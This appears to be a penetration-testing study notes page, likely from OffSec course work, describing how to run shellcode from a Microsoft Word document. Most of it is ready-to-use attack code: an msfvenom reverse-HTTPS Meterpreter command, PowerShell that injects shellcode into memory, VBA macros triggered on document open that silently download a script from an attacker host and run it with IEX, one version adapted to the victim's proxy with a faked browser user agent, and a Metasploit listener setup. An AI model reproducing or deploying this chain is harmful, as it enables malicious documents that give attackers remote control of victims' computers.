---
title: PowerShell Shellcode in Word
layout: default
parent: Client Side Execution
nav_order: 2
---

Similar to CSharp, the theory is to:
1. Allocate memory with `VirtualAlloc(0, sizeOfShellcodeArray, 0x3000, 0x40)`
2. Copy shellcode using `[System.Runtime.InteropServices.Marshal]::Copy(shellcodeBuffer, 0, startAddress, $size)`. startAddress here is the return value of `VirtualAlloc()` in step 1.
3. Execute with `CreateThread(0, 0, startAddress, 0, 0, 0)`, and assign the value to `$thandle`
4. Don't exit the newly created thread even though our PowerShell is closed using `WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")`

First, generate the shellcode using msfvenom:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1
```

Then put it into the Powershell code below for **64-bit**:

```powershell
$Shell32 = @"
using System;
using System.Runtime.InteropServices;

public class Shell32{
[DllImport("Kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

[DllImport("Kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("Kernel32.dll", SetLastError = true)]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

Add-Type $Shell32

[Byte[]] $buf = SHELLCODE HERE
$size = $buf.length
$sizeUIntPtr = New-Object System.UIntPtr $size
[IntPtr]$addr = [Shell32]::VirtualAlloc(0,$sizeUIntPtr,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Shell32]::CreateThread(0,0,$addr,0,0,0);
[Shell32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Note:
* Can remove all the `[return: MarshalAs(...)]`
* Sometimes the DLL might not be correct, refer back to MSDN for the final confirmation

Official Solution from Offsec for **32-bit** (using `msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1`):

```powershell
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
  [DllImport("kernel32")]
  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  [DllImport("kernel32", CharSet=CharSet.Ansi)]
  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  [DllImport("kernel32.dll", SetLastError=true)]
  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32
[Byte[]] $buf = SHELLCODE HERE
$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Using this will detect proxy and with user agent, but might fail if the proxy server got AMSI? Add this to a Microsoft Word Macro `AutoOpen()` **(with proxy aware and user agent)**:

```vb
Sub MyMacro()
    Dim str As String
    str = "powershell -Command """
    str = str & "New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null; "
    str = str & "$keys = Get-ChildItem 'HKU:\'; "
    str = str & "ForEach ($key in $keys) {if ($key.Name -like '*S-1-5-21-*') {$start = $key.Name.substring(10);break}}; "
    str = str & "$proxyAddr=(Get-ItemProperty -Path 'HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\').ProxyServer; "
    str = str & "[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy('http://$proxyAddr'); "
    str = str & "$wc = new-object system.net.WebClient; "
    str = str & "$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');"
    str = str & "$wc.DownloadString('http://IP/run.ps1') | IEX"""
    Shell str, vbHide
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub
```

Using this if default proxy. Add this to a Microsoft Word Macro `AutoOpen()` **(without proxy aware and user agent)**:

```vb
Sub MyMacro()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadString('http://IP/run.ps1') | IEX"
  Shell str, vbHide
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub
```

Finally prepare for incoming shell **(remember to change to 32-bit if required)**:

```
sudo systemctl start apache2
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```


To debug use

```
sudo tail /var/log/apache2/access.log
```
